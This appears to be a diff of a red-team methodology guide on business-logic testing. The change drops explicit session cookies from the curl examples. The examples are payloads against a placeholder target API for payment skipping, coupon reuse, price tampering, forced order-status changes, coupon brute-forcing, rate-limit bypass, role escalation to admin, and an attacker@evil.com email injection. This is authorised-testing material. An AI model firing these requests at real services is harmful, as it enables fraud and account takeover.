@@ -20,6 +20,11 @@ origin: RedteamOpencode
 - `run_tool ffuf` — fuzz parameter values for boundary conditions
 - Browser DevTools — observe workflow state and hidden parameters
 
+For live engagement target requests, prefer plain `run_tool curl` and let the current
+engagement's `auth.json` flow through `rtcurl` automatically. Only add explicit
+`-b` / `-H "Authorization: ..."` when intentionally testing alternate identities,
+broken session handling, or auth override behavior.
+
 ## Methodology
 
 ### 1. Workflow Bypass
@@ -33,19 +38,19 @@ Test if steps in multi-step processes can be skipped:
 # Skip directly to final step
 run_tool curl -s -X POST "http://target/api/order/confirm" \
   -H "Content-Type: application/json" \
-  -d '{"orderId":"123"}' -b "session=TOKEN"
+  -d '{"orderId":"123"}'
 
 # Skip payment step — go from shipping to confirm
 run_tool curl -s -X POST "http://target/api/order/confirm" \
   -H "Content-Type: application/json" \
-  -d '{"orderId":"123","shippingId":"456"}' -b "session=TOKEN"
+  -d '{"orderId":"123","shippingId":"456"}'
 
 # Repeat a step that should only execute once (e.g., apply coupon)
 run_tool curl -s -X POST "http://target/api/coupon/apply" \
-  -d '{"code":"DISCOUNT50","orderId":"123"}' -b "session=TOKEN"
+  -d '{"code":"DISCOUNT50","orderId":"123"}'
 # Apply same coupon again
 run_tool curl -s -X POST "http://target/api/coupon/apply" \
-  -d '{"code":"DISCOUNT50","orderId":"123"}' -b "session=TOKEN"
+  -d '{"code":"DISCOUNT50","orderId":"123"}'
 ```
 
 ### 2. Price / Value Manipulation
@@ -55,28 +60,28 @@ Test if financial values can be tampered:
 ```bash
 # Negative quantity
 run_tool curl -s -X POST "http://target/api/cart/add" \
-  -d '{"productId":"1","quantity":-5,"price":100}' -b "session=TOKEN"
+  -d '{"productId":"1","quantity":-5,"price":100}'
 
 # Zero price
 run_tool curl -s -X POST "http://target/api/cart/add" \
-  -d '{"productId":"1","quantity":1,"price":0}' -b "session=TOKEN"
+  -d '{"productId":"1","quantity":1,"price":0}'
 
 # Fractional values where integer expected
 run_tool curl -s -X POST "http://target/api/cart/add" \
-  -d '{"productId":"1","quantity":0.001}' -b "session=TOKEN"
+  -d '{"productId":"1","quantity":0.001}'
 
 # Overflow: extremely large values
 run_tool curl -s -X POST "http://target/api/transfer" \
-  -d '{"amount":99999999999999}' -b "session=TOKEN"
+  -d '{"amount":99999999999999}'
 
 # Modify price in request (if client sends price)
 # Compare: does server validate price matches catalog?
 run_tool curl -s -X POST "http://target/api/order/create" \
-  -d '{"productId":"1","quantity":1,"price":0.01}' -b "session=TOKEN"
+  -d '{"productId":"1","quantity":1,"price":0.01}'
 
 # Currency confusion — send different currency code
 run_tool curl -s -X POST "http://target/api/payment" \
-  -d '{"amount":100,"currency":"JPY"}' -b "session=TOKEN"
+  -d '{"amount":100,"currency":"JPY"}'
 ```
 
 ### 3. State Abuse / Transition Bypass
@@ -86,22 +91,22 @@ Test if state transitions can be manipulated:
 ```bash
 # Modify status directly
 run_tool curl -s -X PUT "http://target/api/order/123" \
-  -d '{"status":"completed"}' -b "session=TOKEN"
+  -d '{"status":"completed"}'
 
 # Cancel after completion
-run_tool curl -s -X POST "http://target/api/order/123/cancel" -b "session=TOKEN"
+run_tool curl -s -X POST "http://target/api/order/123/cancel"
 
 # Re-open closed ticket/order
 run_tool curl -s -X PUT "http://target/api/order/123" \
-  -d '{"status":"pending"}' -b "session=TOKEN"
+  -d '{"status":"pending"}'
 
 # Access resources in wrong state
 # e.g., download invoice before payment
-run_tool curl -s "http://target/api/order/123/invoice" -b "session=TOKEN"
+run_tool curl -s "http://target/api/order/123/invoice"
 
 # Modify data after approval
 run_tool curl -s -X PUT "http://target/api/application/123" \
-  -d '{"amount":999999}' -b "session=TOKEN"
+  -d '{"amount":999999}'
 ```
 
 ### 4. Rate Limit / Abuse Prevention Bypass
@@ -110,7 +115,7 @@ run_tool curl -s -X PUT "http://target/api/application/123" \
 # Brute force with no rate limit
 for i in $(seq 1 100); do
   run_tool curl -s -X POST "http://target/api/coupon/redeem" \
-    -d "{\"code\":\"GUESS$i\"}" -b "session=TOKEN" -o /dev/null -w "%{http_code}\n"
+    -d "{\"code\":\"GUESS$i\"}" -o /dev/null -w "%{http_code}\n"
 done
 
 # Bypass rate limit via IP rotation headers
@@ -129,7 +134,7 @@ run_tool curl -s "http://target/api/coupon/apply" -d '{"code":"Discount50"}'
 ```bash
 # Email/notification abuse — trigger mass emails
 run_tool curl -s -X POST "http://target/api/invite" \
-  -d '{"emails":["a@x.com","b@x.com","c@x.com",...1000 emails]}' -b "session=TOKEN"
+  -d '{"emails":["a@x.com","b@x.com","c@x.com",...1000 emails]}'
 
 # Referral abuse — refer yourself
 run_tool curl -s -X POST "http://target/api/referral" \
@@ -138,15 +143,15 @@ run_tool curl -s -X POST "http://target/api/referral" \
 # Gift card / point manipulation
 # Buy gift card with gift card balance
 run_tool curl -s -X POST "http://target/api/purchase" \
-  -d '{"product":"gift_card","paymentMethod":"gift_card_balance"}' -b "session=TOKEN"
+  -d '{"product":"gift_card","paymentMethod":"gift_card_balance"}'
 
 # Time-based abuse — use expired offer
 run_tool curl -s -X POST "http://target/api/offer/apply" \
-  -d '{"offerId":"expired_offer_123"}' -b "session=TOKEN"
+  -d '{"offerId":"expired_offer_123"}'
 
 # Privilege escalation via profile update
 run_tool curl -s -X PUT "http://target/api/user/profile" \
-  -d '{"role":"admin","isAdmin":true,"userType":"staff"}' -b "session=TOKEN"
+  -d '{"role":"admin","isAdmin":true,"userType":"staff"}'
 ```
 
 ### 6. Input Validation Logic Flaws
@@ -154,7 +159,7 @@ run_tool curl -s -X PUT "http://target/api/user/profile" \
 ```bash
 # Type confusion — string where number expected
 run_tool curl -s -X POST "http://target/api/transfer" \
-  -d '{"amount":"abc","to":"user2"}' -b "session=TOKEN"
+  -d '{"amount":"abc","to":"user2"}'
 
 # Boolean confusion
 run_tool curl -s -X POST "http://target/api/settings" \
@@ -164,13 +169,13 @@ run_tool curl -s -X POST "http://target/api/settings" \
 
 # Array where single value expected
 run_tool curl -s -X POST "http://target/api/user/update" \
-  -d '{"email":["admin@target.com","attacker@evil.com"]}' -b "session=TOKEN"
+  -d '{"email":["admin@target.com","attacker@evil.com"]}'
 
 # Null / undefined injection
 run_tool curl -s -X POST "http://target/api/payment" \
-  -d '{"amount":null}' -b "session=TOKEN"
+  -d '{"amount":null}'
 run_tool curl -s -X POST "http://target/api/payment" \
-  -d '{}' -b "session=TOKEN"
+  -d '{}'
 ```
 
 ## What to Record
